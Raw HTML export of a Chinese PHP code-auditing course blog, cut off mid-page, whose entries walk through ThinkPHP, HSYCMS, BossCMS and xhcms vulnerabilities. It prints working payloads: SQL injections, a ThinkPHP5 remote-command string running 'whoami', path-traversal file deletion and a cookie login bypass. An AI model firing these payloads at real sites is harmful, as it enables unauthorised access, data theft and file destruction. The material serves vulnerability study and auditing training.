class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable">$User</span> = <span class="title function_ invoke__">D</span>(<span class="string">&#x27;Users&#x27;</span>);</span><br><span class="line">​        <span class="variable">$map</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">​        <span class="comment">// $map = array(&#x27;username&#x27; =&gt; I(&#x27;username&#x27;));</span></span><br><span class="line">​        <span class="variable">$user</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$map</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">​        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$user</span>);</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index.php/Home/Index/test?username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]==-<span class="number">1</span> union select <span class="number">1</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><h5 id="Yxtcmf-版本"><a href="#Yxtcmf-版本" class="headerlink" title="-Yxtcmf 版本"></a>-Yxtcmf 版本</h5><p>寻找符合Demo代码复现段-&gt;触发文件对应URL-&gt;构造Payload</p><p>index.php&#x2F;user&#x2F;login&#x2F;ajaxlogin.html</p><p>account[0]&#x3D;exp&amp;account[1]&#x3D;&#x3D;’123’ and 1&#x3D;(updatexml(1,concat(0x3a,(select database())),1))&amp;password&#x3D;admin&amp;ipForget&#x3D;true</p><h4 id="挖掘框架漏洞-TP5框架-代码执行-amp-调用链-amp-对比修改"><a href="#挖掘框架漏洞-TP5框架-代码执行-amp-调用链-amp-对比修改" class="headerlink" title="#挖掘框架漏洞-TP5框架-代码执行&amp;调用链&amp;对比修改"></a>#挖掘框架漏洞-TP5框架-代码执行&amp;调用链&amp;对比修改</h4><p><strong>5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22</strong> 、<strong>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</strong></p><p>对比：5.0.15&#x3D;&#x3D;5.0.24 覆盖原有调用执行</p><p>?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</p><h5 id="1、学习别人的挖掘思路"><a href="#1、学习别人的挖掘思路" class="headerlink" title="1、学习别人的挖掘思路"></a>1、学习别人的挖掘思路</h5><h5 id="2、利用官方更新说明探针"><a href="#2、利用官方更新说明探针" class="headerlink" title="2、利用官方更新说明探针"></a>2、利用官方更新说明探针</h5><p><a href="https://github.com/top-think/framework">https://github.com/top-think/framework</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day85 代码审计-PHP项目&amp;TP框架&amp;SQL&amp;XSS&amp;架构&amp;路由&amp;调试&amp;写法</title>
      <link href="/2023/03/26/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/"/>
      <url>/2023/03/26/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、审计漏洞-TP框架&amp;SQL注入&amp;XSS跨站</p><p>1、审计思路-SQL监控&amp;调试开关&amp;安全写法</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 开发基础-TP框架-入口&amp;调试&amp;路由&amp;写法等</p><p>​                ➢ 某CMS源码-TP框架-SQL注入-违规WeiPan源码</p><p>​                ➢ CNVD拿1day-TP框架-SQL注入&amp;XSS-HSYCMS</p></blockquote><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407160315425.png" alt="image-20230407160315425"></p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407161912125.png" alt="image-20230407161912125"></p><h4 id="开发基础-TP框架-入口-amp-调试-amp-路由-amp-写法等"><a href="#开发基础-TP框架-入口-amp-调试-amp-路由-amp-写法等" class="headerlink" title="#开发基础-TP框架-入口&amp;调试&amp;路由&amp;写法等"></a>#开发基础-TP框架-入口&amp;调试&amp;路由&amp;写法等</h4><p>1、解释TP框架开发的源码审计要点，</p><p>2、参考开发手册学习文件目录含义，</p><p>3、参考开发手册学习寻找入口目录，</p><p>4、参考开发手册学习寻找URL对应文件，</p><p>5、参考开发手册学习如何开启调试模式，</p><p>6、参考开发手册学习规矩写法和不安全写法。</p><p>参考手册-TP5开发手册PDF-为了掌握了解框架</p><p>首页文件看APP_PATH定义-为了后期分析核心代码</p><p>全局搜索：THINK_VERSION，-为了后期分析此版本是否存在漏洞</p><p>参考手册-本地代码案例对比，-为了后期分析定位代码块或测试漏洞</p><p>配置文件开关-app_debug,app_trace,debug-为了后期分析出现问题分析问题</p><p>本地代码案列-URL访问，测试注入(写法)-为了后期挖掘漏洞第一时间判断问题</p><h4 id="某CMS源码-TP框架-SQL注入-违规Weipan源码"><a href="#某CMS源码-TP框架-SQL注入-违规Weipan源码" class="headerlink" title="#某CMS源码-TP框架-SQL注入-违规Weipan源码"></a>#某CMS源码-TP框架-SQL注入-违规Weipan源码</h4><p>流程：入口-版本-调试-路由-特定漏洞特性写法搜索或版本漏洞触发关键字</p><p>调试开关-&gt;goods.php-&gt;GetProData函数-&gt;ChickIsOpen函数-&gt;断点动态调试</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407172646076.png" alt="image-20230407172646076"></p><p>在执行时会转义单引号</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407173233208.png" alt="image-20230407173233208"></p><h4 id="CNVD拿1day-TP框架-SQL注入-amp-XSS-HSYCMS"><a href="#CNVD拿1day-TP框架-SQL注入-amp-XSS-HSYCMS" class="headerlink" title="#CNVD拿1day-TP框架-SQL注入&amp;XSS-HSYCMS"></a>#CNVD拿1day-TP框架-SQL注入&amp;XSS-HSYCMS</h4><p><a href="https://cloud.tencent.com/developer/article/1785943">Hsycms2.0代码审计 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407165530171.png" alt="image-20230407165530171"></p><p>流程：入口-版本-调试-路由-特定漏洞特性写法搜索或版本漏洞触发关键字</p><h5 id="1-SQL-数据库监控脚本-amp-调试开关分析"><a href="#1-SQL-数据库监控脚本-amp-调试开关分析" class="headerlink" title="1.SQL 数据库监控脚本&amp;调试开关分析"></a>1.SQL 数据库监控脚本&amp;调试开关分析</h5><p>调试开关-&gt;Show.php-&gt;input写法-&gt;SQL执行监控</p><p>input：&#x2F;news&#x2F;151) and if(1&lt;2,sleep(2),sleep(0)) and (1&#x3D;1.html</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407173602182.png" alt="image-20230407173602182"></p><p>可以拼接sql语句</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407173650358.png" alt="image-20230407173650358"></p><p>漏洞原因：这里的‘id’没有写成‘id&#x2F;d’强制转成整型，导致可以拼接字符</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407171942440.png" alt="image-20230407171942440"></p><h5 id="2-XSS-功能点抓包-amp-URL路由对应文件分析"><a href="#2-XSS-功能点抓包-amp-URL路由对应文件分析" class="headerlink" title="2.XSS 功能点抓包&amp;URL路由对应文件分析"></a>2.XSS 功能点抓包&amp;URL路由对应文件分析</h5><p>留言板-&gt;site.php-&gt;book方法-&gt;view视图-&gt;book.html</p><p><img src="/../images/Day85-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-SQL-XSS-%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-%E8%B0%83%E8%AF%95-%E5%86%99%E6%B3%95/image-20230407171656413.png" alt="image-20230407171656413"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day84 代码审计-PHP项目&amp;变量覆盖&amp;反序列化&amp;未授权访问&amp;身份验证</title>
      <link href="/2023/03/26/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
      <url>/2023/03/26/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、审计漏洞-身份验证&amp;变量覆盖&amp;反序列化</p><p>1、审计思路-正则搜索&amp;功能追踪&amp;辅助工具</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h3 id="常见漏洞关键字："><a href="#常见漏洞关键字：" class="headerlink" title="#常见漏洞关键字："></a>#常见漏洞关键字：</h3><h5 id="1、SQL注入："><a href="#1、SQL注入：" class="headerlink" title="1、SQL注入："></a>1、SQL注入：</h5><h6 id="select-、-insert-、-update-、mysql-query-、-mysqli等"><a href="#select-、-insert-、-update-、mysql-query-、-mysqli等" class="headerlink" title="select 、 insert 、 update  、mysql_query 、  mysqli等"></a>select 、 insert 、 update  、mysql_query 、  mysqli等</h6><h5 id="2、文件上传："><a href="#2、文件上传：" class="headerlink" title="2、文件上传："></a>2、文件上传：</h5><h6 id="FILES、type-x3D-”file”、上传、move-uploaded-file-等"><a href="#FILES、type-x3D-”file”、上传、move-uploaded-file-等" class="headerlink" title="$_FILES、type&#x3D;”file”、上传、move_uploaded_file()等"></a>$_FILES、type&#x3D;”file”、上传、move_uploaded_file()等</h6><h5 id="3、XSS跨站："><a href="#3、XSS跨站：" class="headerlink" title="3、XSS跨站："></a>3、XSS跨站：</h5><h6 id="print、-print-r-、echo、-sprintf、-die-、var-dump-、var-export等"><a href="#print、-print-r-、echo、-sprintf、-die-、var-dump-、var-export等" class="headerlink" title="print、 print_r 、echo、 sprintf、 die 、var_dump 、var_export等"></a>print、 print_r 、echo、 sprintf、 die 、var_dump 、var_export等</h6><h5 id="4、文件包含："><a href="#4、文件包含：" class="headerlink" title="4、文件包含："></a>4、文件包含：</h5><h6 id="include-、include-once、-require、-require-once等"><a href="#include-、include-once、-require、-require-once等" class="headerlink" title="include 、include_once、 require、 require_once等"></a>include 、include_once、 require、 require_once等</h6><h5 id="5、代码执行："><a href="#5、代码执行：" class="headerlink" title="5、代码执行："></a>5、代码执行：</h5><h6 id="eval-、-eval-、assert-、-preg-replace-、-call-user-func-、call-user-func-array等"><a href="#eval-、-eval-、assert-、-preg-replace-、-call-user-func-、call-user-func-array等" class="headerlink" title="eval 、@eval 、assert 、 preg_replace 、 call_user_func  、call_user_func_array等"></a>eval 、@eval 、assert 、 preg_replace 、 call_user_func  、call_user_func_array等</h6><h5 id="6、命令执行："><a href="#6、命令执行：" class="headerlink" title="6、命令执行："></a>6、命令执行：</h5><h6 id="system-、exec-、shell-exec、-96-96-、passthru、-pcntl-exec、-popen、-proc-open"><a href="#system-、exec-、shell-exec、-96-96-、passthru、-pcntl-exec、-popen、-proc-open" class="headerlink" title="system 、exec 、shell_exec、 &#96;&#96; 、passthru、 pcntl_exec、 popen、 proc_open"></a>system 、exec 、shell_exec、 &#96;&#96; 、passthru、 pcntl_exec、 popen、 proc_open</h6><h5 id="7、变量覆盖："><a href="#7、变量覆盖：" class="headerlink" title="7、变量覆盖："></a>7、变量覆盖：</h5><h6 id="extract-、parse-str-、import-request-variables-等"><a href="#extract-、parse-str-、import-request-variables-等" class="headerlink" title="extract() 、parse_str() 、import_request_variables() $$ 等"></a>extract() 、parse_str() 、import_request_variables() $$ 等</h6><h5 id="8、反序列化："><a href="#8、反序列化：" class="headerlink" title="8、反序列化："></a>8、反序列化：</h5><h6 id="serialize-、-unserialize-、-construct-destruct等"><a href="#serialize-、-unserialize-、-construct-destruct等" class="headerlink" title="serialize()、 unserialize() 、__construct __destruct等"></a>serialize()、 unserialize() 、__construct __destruct等</h6><h5 id="9、其他漏洞："><a href="#9、其他漏洞：" class="headerlink" title="9、其他漏洞："></a>9、其他漏洞：</h5><h6 id="unlink-、-file-get-contents-、-show-source-、-file-、fopen-等"><a href="#unlink-、-file-get-contents-、-show-source-、-file-、fopen-等" class="headerlink" title="unlink()、 file_get_contents()、 show_source()、 file() 、fopen()等"></a>unlink()、 file_get_contents()、 show_source()、 file() 、fopen()等</h6><h3 id="通用关键字："><a href="#通用关键字：" class="headerlink" title="#通用关键字："></a>#通用关键字：</h3><h5 id="GET、-POST、-REQUEST、-FILES、-SERVER等"><a href="#GET、-POST、-REQUEST、-FILES、-SERVER等" class="headerlink" title="$_GET、$_POST、$_REQUEST、$_FILES、$_SERVER等"></a>$_GET、$_POST、$_REQUEST、$_FILES、$_SERVER等</h5><p>一般经过封装过的语句可能经过关键字搜索不到，需要配合找功能点</p><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230329164931245.png" alt="image-20230329164931245"></p><p>功能点或关键字分析可能存在漏洞</p><p>抓包或搜索关键字找到代码出处及对应文件</p><p>追踪过滤或接受的数据函数，寻找触发此函数或代码的地方进行触发测试</p><p>-常规或部分MCV模型源码可以采用关键字的搜索挖掘思路</p><p>-框架MCV墨香源码一般会采用功能点分析抓包追踪挖掘思路</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ CNVD拿1day-验证&amp;未授权-xhcms&amp;Bosscms</p><p>​                ➢ CNVD拿1day-变量覆盖引发文件包含-Metinfo</p><p>​                ➢ CNVD拿1day-反序列化引发文件读取-PhpMyadmin</p></blockquote><h4 id="CNVD拿1day-验证-amp-未授权-xhcms-amp-Bosscms"><a href="#CNVD拿1day-验证-amp-未授权-xhcms-amp-Bosscms" class="headerlink" title="#CNVD拿1day-验证&amp;未授权-xhcms&amp;Bosscms"></a>#CNVD拿1day-验证&amp;未授权-xhcms&amp;Bosscms</h4><h4 id="1、xhcms-身份验证："><a href="#1、xhcms-身份验证：" class="headerlink" title="1、xhcms 身份验证："></a>1、xhcms 身份验证：</h4><p><a href="https://blog.csdn.net/Alexz__/article/details/116301518">(23条消息) 熊海（isea cms）代码审计漏洞总结_熊海cms下载_Alexz__的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/HBohan/article/details/121098795">(23条消息) 【网络安全】xhCMS代码审计思路_IT老涵的博客-CSDN博客</a></p><p>找登录后验证文件，看验证逻辑</p><p>cookie:user&#x3D;1</p><p>这里只要user值不为空即可访问admin后台</p><h4 id="2、BossCMS-未授权访问："><a href="#2、BossCMS-未授权访问：" class="headerlink" title="2、BossCMS 未授权访问："></a>2、BossCMS 未授权访问：</h4><p><strong>复现：</strong><a href="https://blog.csdn.net/weixin_45794666/article/details/122684119">(23条消息) BossCMSV1.0代码审计_booscms代码审计_6right的博客-CSDN博客</a></p><p>看验证流程逻辑，找后台测试功能，看验证文件</p><p>漏洞信息来源文件代码比对：Beyond Compare 4</p><p>admin.class.php-&gt;backup.class.php-&gt;delete方法</p><p>admin&#x2F;?mold&#x3D;safe&amp;part&#x3D;backup&amp;func&#x3D;delete&amp;id&#x3D;..&#x2F;..&#x2F;..&#x2F;1.txt</p><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406095306500.png" alt="image-20230406095306500"></p><h6 id="找到更新版本和漏洞版本作比较，这些文件可以忽略"><a href="#找到更新版本和漏洞版本作比较，这些文件可以忽略" class="headerlink" title="找到更新版本和漏洞版本作比较，这些文件可以忽略"></a>找到更新版本和漏洞版本作比较，这些文件可以忽略</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406095403354.png" alt="image-20230406095403354"></p><h6 id="查看有差异的文件"><a href="#查看有差异的文件" class="headerlink" title="查看有差异的文件"></a>查看有差异的文件</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406095543614.png" alt="image-20230406095543614"></p><h6 id="点进去查看修改增加的地方"><a href="#点进去查看修改增加的地方" class="headerlink" title="点进去查看修改增加的地方"></a>点进去查看修改增加的地方</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406095634968.png" alt="image-20230406095634968"></p><h6 id="来到管理员登录的地方，未授权访问要选好功能，选择危害性大的测试"><a href="#来到管理员登录的地方，未授权访问要选好功能，选择危害性大的测试" class="headerlink" title="来到管理员登录的地方，未授权访问要选好功能，选择危害性大的测试"></a>来到管理员登录的地方，未授权访问要选好功能，选择危害性大的测试</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406100011728.png" alt="image-20230406100011728"></p><h6 id="在admin目录下找一个删除功能，这里白盒测试可以先去功能点"><a href="#在admin目录下找一个删除功能，这里白盒测试可以先去功能点" class="headerlink" title="在admin目录下找一个删除功能，这里白盒测试可以先去功能点"></a>在admin目录下找一个删除功能，这里白盒测试可以先去功能点</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406100910168.png" alt="image-20230406100910168"></p><h6 id="在数据备份这里右键复制链接访问"><a href="#在数据备份这里右键复制链接访问" class="headerlink" title="在数据备份这里右键复制链接访问"></a>在数据备份这里右键复制链接访问</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406101845989.png" alt="image-20230406101845989"></p><h6 id="根据链接里面的内容找到源码中对应的上述代码中的文件功能点，这里虽然是func-x3D-init，但是这个文件里面同样存在func-x3D-delete-就是上面的代码图处"><a href="#根据链接里面的内容找到源码中对应的上述代码中的文件功能点，这里虽然是func-x3D-init，但是这个文件里面同样存在func-x3D-delete-就是上面的代码图处" class="headerlink" title="根据链接里面的内容找到源码中对应的上述代码中的文件功能点，这里虽然是func&#x3D;init，但是这个文件里面同样存在func&#x3D;delete,就是上面的代码图处"></a>根据链接里面的内容找到源码中对应的上述代码中的文件功能点，这里虽然是func&#x3D;init，但是这个文件里面同样存在func&#x3D;delete,就是上面的代码图处</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406101944153.png" alt="image-20230406101944153"></p><h6 id="这里再根目录创建一个1-txt，尝试构造url删除，这里需要以post方式复制url参数，以id为文件路径"><a href="#这里再根目录创建一个1-txt，尝试构造url删除，这里需要以post方式复制url参数，以id为文件路径" class="headerlink" title="这里再根目录创建一个1.txt，尝试构造url删除，这里需要以post方式复制url参数，以id为文件路径"></a>这里再根目录创建一个1.txt，尝试构造url删除，这里需要以post方式复制url参数，以id为文件路径</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406102720668.png" alt="image-20230406102720668"></p><h6 id="上面删除成功，但是界面依然还是登录界面，不能进入后台，说明还是存在验证，找到backup-class是谁调用或者继承谁，找到了admin类，跟踪这个类"><a href="#上面删除成功，但是界面依然还是登录界面，不能进入后台，说明还是存在验证，找到backup-class是谁调用或者继承谁，找到了admin类，跟踪这个类" class="headerlink" title="上面删除成功，但是界面依然还是登录界面，不能进入后台，说明还是存在验证，找到backup.class是谁调用或者继承谁，找到了admin类，跟踪这个类"></a>上面删除成功，但是界面依然还是登录界面，不能进入后台，说明还是存在验证，找到backup.class是谁调用或者继承谁，找到了admin类，跟踪这个类</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406103141138.png" alt="image-20230406103141138"></p><h6 id="可以看到其实是有session验证的，否则会重定向到login登录界面"><a href="#可以看到其实是有session验证的，否则会重定向到login登录界面" class="headerlink" title="可以看到其实是有session验证的，否则会重定向到login登录界面"></a>可以看到其实是有session验证的，否则会重定向到login登录界面</h6><p><img 